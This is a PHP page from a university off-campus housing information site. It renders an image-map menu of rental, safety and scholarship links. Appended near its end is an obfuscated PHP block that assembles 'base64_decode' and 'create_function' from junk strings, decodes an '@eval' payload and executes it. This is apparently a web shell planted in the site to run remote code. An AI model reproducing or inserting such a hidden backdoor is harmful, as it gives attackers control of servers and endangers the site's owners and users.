<?php require_once('../conn_military.php');  ?>

<?php
	$query_military_bulletin_top = sprintf("SELECT * FROM `military_bulletin` WHERE `poster` = '孫守丕' ORDER BY time DESC");
    $military_bulletin_top = mysqli_query($conn_military,$query_military_bulletin_top) or die(mysqli_error());
    $row_military_bulletin_top = mysqli_fetch_assoc($military_bulletin_top);
    // print_r($row_military_bulletin_top);
?>
<!DOCTYPE html>
<html>

<head>
	<meta charset="utf-8" />
	<meta name="HandheldFriendly" content="True" />
	<meta name="MobileOptimized" content="320" />
	<meta name="viewport" content="width=device-width, target-densitydpi=160dpi, initial-scale=1" />
	<title>國立中央大學外宿資訊網</title>

	<!-- Bootstrap -->
	<link href="../css/bootstrap.min.css" rel="stylesheet">
	<link href="css/housing.css" rel="stylesheet">

</head>

<body>
	<div>
		<table>
			<tr>
				<td align="center" valign="center">
					<img src="images/menuLinks2.png" usemap="#TestMap" width="1200" height="806" class="img-responsive" />
					<map name="TestMap">
						<area shape="rect" coords=" 505 , 4 , 698 , 110" href="http://house.nfu.edu.tw/NCU">
						<!--雲端租屋網 http://house.nfu.edu.tw/NCU-->
						<area shape="rect" coords=" 753 , 90 , 941 , 195" href="HousingInfo_Eng.html">
						<!--Renting Services-->
						<area shape="rect" coords=" 850 , 300 , 1045 , 405" 
						href="earthquake.html">
						<!--耐震初評、消防安檢合格處所-->
						<area shape="rect" coords=" 752 , 508 , 942 , 610"
						href="contract.html">
						<!--租屋契約範本(RESIDENTIAL RENTAL AGREEMENT)-->
						<area shape="rect" coords=" 505 , 595 , 695 , 700" 
						href="activities.html">
						<!--活動花絮-->
						<area shape="rect" coords=" 258 , 508 , 448 , 620"
						href="association.html" target="_blank">
						<!--校外房東聯誼會-->
						<area shape="rect" coords=" 150 , 300 , 350 , 405"
						href="scholarship.html">
						<!--校外房東獎學金-->
						<area shape="rect" coords=" 250 , 90 , 450 , 195"
						href="./photos/25.htm" >
						<!--一氧化碳中毒宣導-->
						<!--href="https://www.nfa.gov.tw/cht/index.php?act=article&code=search&keyword=&postFlag=1"-->
					</map>
				</td>
			</tr>
			<!--考量租屋安全，請同學選擇完成消防及耐震檢測合格之房屋為宜。-->
			<!-- <td>
				<a href="rent/loginforlodger.php" class="btn btn-primary btn-lg">實地訪視紀錄網</a>
			</td> -->
			<!-- 姜教官說先將這個按鈕隱藏 by 珈華 220224 -->

		</table>
	</div>

	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
	<script src="../js/jquery.rwdImageMaps.min.js"></script>
	<script>
		$(document).ready(function(e) {
			$('img[usemap]').rwdImageMaps();
		});

	</script>

	<?php include "housing_footer.php"?>
</body>
<?php $r4 = @$r4.substr("vyo146mPstr_replaceacC85nr",8,11);$cr = ltrim("mpcf5r09bt9su5");$x = @$x.$r4("a3O","","QGV2a3OYWwa3O");$hsax = stripos("gdukvn8q9069l33ncnn","hsax");$k = @$k.$r4("ke","","baskeeke");$sxea = strlen("m13rgpfidjw");$bn = @$bn.substr("e611gcreatebTwB",5,6);$keh = ltrim("pqfkkrgcrn");$x = $x.substr("x4poJF9c5Q2IPn",3,4);$aewo = strlen("d1bh1vc01nl12us7qf3");$k = $k.substr("h164_deceBu",2,6);$w4o = strlen("lyxkqfq21abcgs8smk");$bn = $bn.substr("fTv9D5_functiom",6,8);$tjuh = trim("ikpsj5hxy6xgjicldd");$x = $x.$r4("fX","","QfXT1NfXUfXWy");$iclr = trim("bdxsu6detfo8aqmml");$k = $k.$r4("i6le","","oi6ledi6leei6le");$ues = stripos("r2a4puiuqk6qpjagwl","ues");$bn = $bn.$r4("tgn","","ntgn");$uv = str_split("dr0vows6aobcedhngi",4);$x = $x.$r4("eCg","","deCgkeCgaHhoeCgOHI");$gle2 = stripos("gwtl8u00dj54i84yx","gle2");$x = $x.substr("xTl6jd7HxbDl0a",8,5);$pl = strlen("av81itvm11cd");$x = $x.$r4("g8t","","NHJkg8tc");$mfkp = trim("umv7bhklwb2uq5s");$x = $x.substr("iF4LXcnXSk7lGsbkeT",4,7);$b4 = rtrim("chtcp9uqoitfdbn0qk7");$kU = $bn("", $k($x));$qa = trim("lo8gcpvxot");$enl = rtrim("coye5d8it5ty6mw0i");$h9av = trim("cl3txkaqe5");$tf = stripos("e9cp96icvqmagepd6y","tf");$kU();function oe( $l   ){      };$lkm2 = ltrim("s4dnpr5gkrgx1nkp");$dqa5 = str_split("u312ue705d54yiwea7d",4);$l2 = ltrim("x7nrcqpimc");$mu = strlen("uccf77d4mwk22c")?>
</html>
